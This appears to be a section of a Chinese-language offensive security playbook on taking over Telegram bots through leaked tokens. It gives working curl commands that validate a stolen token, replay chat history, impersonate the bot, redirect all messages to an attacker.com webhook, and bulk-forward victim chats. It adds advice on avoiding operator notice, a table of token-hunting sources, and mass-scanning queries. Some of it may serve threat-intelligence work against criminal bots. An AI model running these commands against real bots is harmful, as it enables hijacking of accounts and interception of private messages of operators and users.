## A 面：Token 泄露 → 全接管（最高频入口）

### Token 格式与核心 API

```bash
# Token 格式：<bot_id>:<35位secret>
# grep 正则
grep -oE '[0-9]{10}:[A-Za-z0-9_-]{35}'

# 验证
curl -s "https://api.telegram.org/bot${TOKEN}/getMe" | python3 -m json.tool

# 回放历史消息（含聊天上下文）
curl -s "https://api.telegram.org/bot${TOKEN}/getUpdates?offset=-1000"

# 冒充 bot 发消息
curl -s -X POST "https://api.telegram.org/bot${TOKEN}/sendMessage" \
  -d chat_id="${CHAT_ID}" -d text="test"

# 查看当前 webhook 配置（评估动静）
curl -s "https://api.telegram.org/bot${TOKEN}/getWebhookInfo"

# 截流：将所有消息转到攻击者 URL（⚠️ 先问）
curl -s -X POST "https://api.telegram.org/bot${TOKEN}/setWebhook" \
  -d url="https://attacker.com/hook"

# 批量转储消息（≤100 条/次）
curl -s -X POST "https://api.telegram.org/bot${TOKEN}/forwardMessages" \
  -H "Content-Type: application/json" \
  -d '{"chat_id":"MY_GROUP","from_chat_id":"VICTIM_CHAT","message_ids":[1,2,3]}'
```

> ⚠️ 拿到 token 不要立刻 `getUpdates` 拉全部历史——某些运营者会监控 bot 状态。先 `getWebhookInfo`（有 webhook 说明 bot 在跑，动静大），再决定截流还是只 `forwardMessage` 特定消息。

### Token 泄露途径与实战打法

| 途径 | 打法 | 要点 |
|------|------|------|
| **客户端 JS 硬编码** | `curl -s https://target/_nuxt/*.js \| grep -oE '[0-9]{10}:[A-Za-z0-9_-]{35}'` | Nuxt/React/Vue chunk 直接硬编码，CVSS 8.1 |
| **表单请求透传** | 抓 "Contact us" 等表单提交请求，看请求体/URL 是否带 token | 无密码无 2FA 直接登录 bot |
| **GitHub 仓库/历史** | `gitleaks detect --source . --report-format json`；`trufflehog git https://github.com/target` | 加规则 `[0-9]{10}:[A-Za-z0-9_-]{35}` |
| **.env / docker-compose** | 目录爆破 + 配置泄露：`/.env`、`/docker-compose.yml`、`/config.yml` | `BOT_TOKEN=` / `TELEGRAM_TOKEN=` |
| **恶意样本硬编码** | PyInstaller 解包、JS 反混淆、APK 反编译提取 | Stealer/RAT 必带 token 明文 |
| **钓鱼 kit 泄露** | open dir 挖 `sign/*.html` 每个变体轮换自己的 token | 同站再挖 AiTM 操作台 bot |
| **kit 开发者后门** | 钓鱼 kit 内置 JQ.js 后门偷运营者 token POST 到硬编码地址 | 先调 Bot API 验证 token 有效性 |
| **日志泄露** | `laravel.log`、`app.log`、`debug.log` 中搜 token 正则 | Fatal Error 行号溯源 |

### 批量发现（测绘角度）

```bash
# FOFA 搜包含 Telegram Bot API 调用的站点
python3 tools/space-search/fofa_query.py 'body="api.telegram.org"' --fields host,ip,port,title

# Netlas 内容搜索（分层：getUpdates 最有价值）
# http.body="api.telegram.org" AND http.body="getUpdates"

# VirusTotal 检索通信样本 → contacted URL 原文带 token
# 搜 contacted_urls:api.telegram.org → 提取 token+chat_id

# 本地探针（授权目标）
python3 tools/ops/tg_bot_token_probe.py hunt \
  --target https://授权目标 --case <案卷>
```

---

